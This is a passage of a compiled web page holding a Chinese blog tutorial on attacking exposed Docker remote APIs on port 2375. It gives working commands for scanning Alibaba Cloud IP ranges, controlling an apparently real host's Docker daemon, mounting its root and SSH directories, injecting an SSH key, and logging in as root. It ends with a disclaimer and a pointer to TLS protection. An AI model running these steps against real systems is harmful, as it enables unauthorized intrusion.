import{ah as s,ai as a,an as e,am as n}from"./app-Dcfi_8Wd.js";const t="/assets/t_70-ELbkuvGe.png",l={};function h(k,i){return n(),a("div",null,i[0]||(i[0]=[e(`<h1 id="docker的2375攻击和解决方案" tabindex="-1"><a class="header-anchor" href="#docker的2375攻击和解决方案"><span>Docker的2375攻击和解决方案</span></a></h1><p>相信了解过<a href="https://so.csdn.net/so/search?q=docker&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener noreferrer">docker</a> remote API的同学对2375端口都不陌生了，2375是docker远程操控的默认端口，通过这个端口可以直接对远程的docker daemon进行操作。</p><p>当$HOST主机以**<code>docker daemon -H=0.0.0.0:2375</code>**方式启动daemon时，可以在外部机器对 $HOST 的docker daemon进行直接操作：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">docker</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> tcp://</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$HOST</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">:2375</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ps</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>好，说说如何“入侵”，怎么通过这个端口入侵宿主机呢？</p><p>这个应该要从几个点说起吧：</p><ul><li><ol><li>docker对<code>user namespace</code>没有做隔离，也就是说，容器内部的root用户就是宿主机的root用户，一旦挂载目录，就可以在容器内部以宿主机的root用户身份对挂载的文件系统随意修改了。</li></ol></li><li><ol><li>docker服务拥有很高的执行权利(相当于root)，并且在docker用户组下的普通用户不需要任何其他验证就可以执行docker run等命令。</li></ol></li><li><ol start="2"><li>暴露的docker remote API端口如果没有启动ssl验证的话，任何能连通到这台docker宿主机的的机器都可以随意操作这台docker宿主机的docker daemon（docker run、docker ps、docker rm等等这些命令都不在话下）。</li></ol></li></ul><p>结合以上3点，就基本具备入侵docker宿主机的条件了</p><p>讲得似乎有点悬，不多说，直接拿一个活鲜鲜的例子来讲吧：</p><p>(请允许我用最近新学的一道菜将流程带过 ╮(￣▽￣)╭ )</p><h3 id="秘制红烧肉-docker版" tabindex="-1"><a class="header-anchor" href="#秘制红烧肉-docker版"><span>秘制红烧肉(docker版)</span></a></h3><p>材料：一整块一整块的“5花”IP段，越肥越好（小白用户越多越好）</p><p>配料：nmap，docker</p><p>step 1: 扫描2375端口</p><p>怎么扫？我选用的是简单易用的黑客必备神器<code>nmap</code>了。</p><p>扫哪里呢？我选的目标是aliyun的IP段，百度得知：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">42.96.128.0/17</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    Alibaba</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (Beijing) Technology Co., Ltd. China  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">42.120.0.0/16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    Aliyun</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Computing</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Co.,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> LTD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> China</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">42.121.0.0/16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    Aliyun</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Computing</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Co.,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> LTD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> China</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">42.156.128.0/17</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    Aliyun</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Computing</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Co.,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> LTD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> China</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">110.75.0.0/16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    Asia</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Pacific</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Information</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Centre</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> China</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">223.7.0.0/16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    Hangzhou</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Alibaba</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Advertising</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Co.,Ltd.</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我不生产IP，我只是百度的搬运工，别问我这些IP从那来，我也想知道~ &gt;.&lt;</p><p>将上面IP内容保存在一个文件中，如 aliyun.list</p><p>开始扫描：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">cat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> aliyun.list</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">| </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">awk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;{print $1}&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">xargs</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -n</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -I</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> {}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> nmap</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -sT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p2375</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> {}</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --open</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 简单解释一下命令：</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># awk 将第一列IP网段过滤出来</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># xargs 将过滤出来的IP一个一个的分次送给nmap，-I {} 是指使用{}来代替传送的参数</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># ...</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Starting Nmap 7.01 ( https://nmap.org ) at 2016-06-05 09:57 CST</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Nmap scan report for 42.96.MOSAIC.MOSAIC</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Host is up (0.070s latency).</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># PORT     STATE SERVICE</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 2375/tcp open  docker</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># ...</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>不到两分钟，第一块<code>42.96.MOSAIC.MOSAIC</code>（五花肉已打码） “五花肉”选好了，来吧~</p><h3 id="step-2-测试2375的直接控制权" tabindex="-1"><a class="header-anchor" href="#step-2-测试2375的直接控制权"><span>step 2: 测试2375的直接控制权</span></a></h3><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">docker</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> tcp://42.96.MOSAIC.MOSAIC:2375</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ps</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># CONTAINER ID        IMAGE                              COMMAND                  CREATED            STATUS             PORTS           </span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 73aa690e7c92        imdjh/owncloud-with-ocdownloader   &quot;/entrypoint.sh&quot;         9 days ago          Up 3 days           0.0.0.0:9009-&gt;80</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># f57c56af0e29        rethinkdb:2.3.2                    &quot;rethinkdb --bind all&quot;   9 days ago          Up 3 days           8080/tcp, 28015/</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 37c1401db593        gaomd/ikev2-vpn-server:0.3.0       &quot;/bin/sh -c /usr/bin/&quot;   10 days ago         Up 3 days           0.0.0.0:500-&gt;500</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># af7338a5426d        nginx:1.9-alpine                   &quot;nginx -g &#39;daemon off&quot;   3 weeks ago         Up 3 days           443/tcp, 0.0.0.0</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># ...</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这个服务器的owner也太配合了(⊙ο⊙)，ps直接看到内容，说明这个主机的2375是没有ssl验证的，基本满足入侵要求。</p><p>“五花”洗好，切好，准备下锅~</p><h3 id="step-3-远程启动自己的容器" tabindex="-1"><a class="header-anchor" href="#step-3-远程启动自己的容器"><span>step 3: 远程启动自己的容器</span></a></h3><p>拿到了docker的控制权能做什么呢？ <strong>拿到了就呵呵了~</strong></p><div class="language-r line-numbers-mode" data-highlighter="shiki" data-ext="r" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># images 看看本地已有的镜像</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># docker -H tcp://42.96.MOSAIC.MOSAIC:2375 images</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># ...</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># swarm                              latest              47dc182ea74b        4 weeks ago         19.32 MB</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># jwilder/nginx-proxy                latest              203b20631e41        4 weeks ago         255.6 MB</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># ubuntu                             latest              c5f1cf30c96b        4 weeks ago         120.8 MB</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># shipyard/shipyard                  latest              ba426f0944bc        5 weeks ago         58.92 MB</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># ...</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>省略了一部分输出，镜像还蛮多的，就选个ubuntu吧</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># docker -H tcp://42.96.MOSAIC.MOSAIC:2375 run --rm -it --entrypoint bash -v /root:/tmp/root -v /etc/ssh:/tmp/ssh_etc -v /var/log:/tmp/log ubuntu</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>看到这步，相信对ssh有一些了解的同学应该就明白了</p><h3 id="step-4-ssh-pub-key-注入" tabindex="-1"><a class="header-anchor" href="#step-4-ssh-pub-key-注入"><span>step 4: ssh pub key 注入</span></a></h3><p>在刚刚启动的容器中先看看 <code>/tmp/ssh_etc/sshd_config</code> (就是宿主机的<code>/etc/ssh/sshd_config</code>) 的PermitRootLogin字段。如果是<code>no</code>就改成<code>yes</code>，允许root通过ssh登录</p><p>然后在<strong>你的机器上</strong>生成一对新的pub key（已经有ssh key的也建议生成一个新的，不要使用自己日常使用的ssh pub key）</p><div class="language-perl line-numbers-mode" data-highlighter="shiki" data-ext="perl" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 使用 ssh-keygen生成</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ssh-keygen -t rsa -C </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;hello</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75;">@</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">world</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">.com&quot;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 执行命令后的提示Enter file in which to save the key要看好，不要把自己的ssh key覆盖了，可以选着/tmp/id_rsa</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 其他提示enter到底即可</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>继续，注入ssh pub key，回到<strong>刚刚启动的容器</strong>执行</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">cat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt;&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/tmp/root/.ssh/authorized_keys</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &lt;&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">EOF</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&gt;ssh-rsa AAA....     # 这里粘贴你刚刚在自己机器生成的/tmp/id_rsa.pub</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&gt;EOF</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># 如果/tmp/root/.ssh目录不存在，就直接创建</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>八角香叶生抽老抽醋都加上，中火烹饪，准备出锅~</p><h3 id="step-5-登入服务器" tabindex="-1"><a class="header-anchor" href="#step-5-登入服务器"><span>step 5: 登入服务器</span></a></h3><div class="language-ruby line-numbers-mode" data-highlighter="shiki" data-ext="ruby" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># ssh -i 指定秘钥登录</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ssh </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">i </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">tmp</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">id_rsa root@</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">42.96</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">MOSAIC</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#E5C07B;">MOSAIC</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic x86_64)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># ssh -i 指定秘钥登录</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ssh </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">i </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">tmp</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">id_rsa root@</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">42.96</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">MOSAIC</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#E5C07B;">MOSAIC</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic x86_64)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># * Documentation:  https://help.ubuntu.com/</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Welcome to aliyun Elastic Compute Service!</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Last login: Fri Jun  3 01:38:07 2016 from 120.85.MOSAIC.MOSAIC</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># manpath: can&#39;t set the locale; make sure $LC_* and $LANG are correct</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># root@iZ28p9b7e***:~# </span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># ...</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>大火收汁，起锅!</p><h2 id="郑重声明" tabindex="-1"><a class="header-anchor" href="#郑重声明"><span>郑重声明</span></a></h2><p>以上教程仅为交流学习之用，<code>42.96.MOSAIC.MOSAIC</code> 服务器上的<code>id_rsa.pub</code>在制作完本教程后已主动清除，并在服务上留言告知。</p><p>如果你一不小心也发现了可用的2375端口，<strong>希望也能点到即止，误做他用</strong>，或者发现其他入侵漏洞，可以和大家交流学习。</p><h2 id="_2375是docker漏洞吗" tabindex="-1"><a class="header-anchor" href="#_2375是docker漏洞吗"><span>2375是docker漏洞吗？</span></a></h2><p>非也！<strong>2375直接裸露地暴露在公网上纯属是用户习惯或者偷懒的问题</strong>，<strong>2375可以在相对安全的内部网络中方便测试使用，并不适合使用在投入到生产环境中。</strong></p><p>docker官网第一篇文档quick start上有句话是这样子的：</p><div class="language-txt line-numbers-mode" data-highlighter="shiki" data-ext="txt" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Warning: Changing the default docker daemon binding to a TCP port or</span></span>
<span class="line"><span>Unix docker user group will increase your security risks by allowing</span></span>
<span class="line"><span>non-root users to gain root access on the host. Make sure you control</span></span>
<span class="line"><span>access to docker. If you are binding to a TCP port, anyone with</span></span>
<span class="line"><span>access to that port has full Docker access; so it is not advisable</span></span>
<span class="line"><span> on an open network.</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>已经Warning告知：如果将daemon直接暴露在一个TCP端口，将可能会被以非root用户去获取宿主机的root权限。其实上面的说提到的服务器之所以这么容器被入侵，也正是这个原因。</p><h2 id="何以防之" tabindex="-1"><a class="header-anchor" href="#何以防之"><span>何以防之</span></a></h2><p>那么，问题来了，如果想用Remote API，又不想有被入侵的风险，怎么办呢？</p><p>docker官方文档上介绍了一种通过CA认证方式使用Remote API</p><p>具体可以参考：<a href="https://docs.docker.com/engine/security/https/" target="_blank" rel="noopener noreferrer">Protect the Docker daemon socket</a></p><p>(等理解了再补一篇博客吧，就姑且让我以一个链接的形式带过吧O.O)</p><p>配置过程还算是比较简单的，下面放一张图，展示配置SSL后的效果：</p><p><img src="`+t+'" alt="img"></p><p>文章知识点与官方知识档案匹配，可进一步学习相关知识</p>',58)]))}const r=s(l,[["render",h]]),d=JSON.parse('{"path":"/note-book/Docker/Docker%E7%9A%842375%E6%94%BB%E5%87%BB%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.html","title":"Docker的2375攻击和解决方案","lang":"zh-CN","frontmatter":{"description":"Docker的2375攻击和解决方案 相信了解过docker remote API的同学对2375端口都不陌生了，2375是docker远程操控的默认端口，通过这个端口可以直接对远程的docker daemon进行操作。 当$HOST主机以**docker daemon -H=0.0.0.0:2375**方式启动daemon时，可以在外部机器对 $HO...","head":[["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Docker的2375攻击和解决方案\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2024-05-29T02:44:55.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"Paper-Dragon\\",\\"url\\":\\"https://github.com/Paper-Dragon\\",\\"email\\":\\"2678885646@qq.com\\"}]}"],["meta",{"property":"og:url","content":"https://www.geekery.cn/note-book/Docker/Docker%E7%9A%842375%E6%94%BB%E5%87%BB%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.html"}],["meta",{"property":"og:site_name","content":"运维开发绿皮书"}],["meta",{"property":"og:title","content":"Docker的2375攻击和解决方案"}],["meta",{"property":"og:description","content":"Docker的2375攻击和解决方案 相信了解过docker remote API的同学对2375端口都不陌生了，2375是docker远程操控的默认端口，通过这个端口可以直接对远程的docker daemon进行操作。 当$HOST主机以**docker daemon -H=0.0.0.0:2375**方式启动daemon时，可以在外部机器对 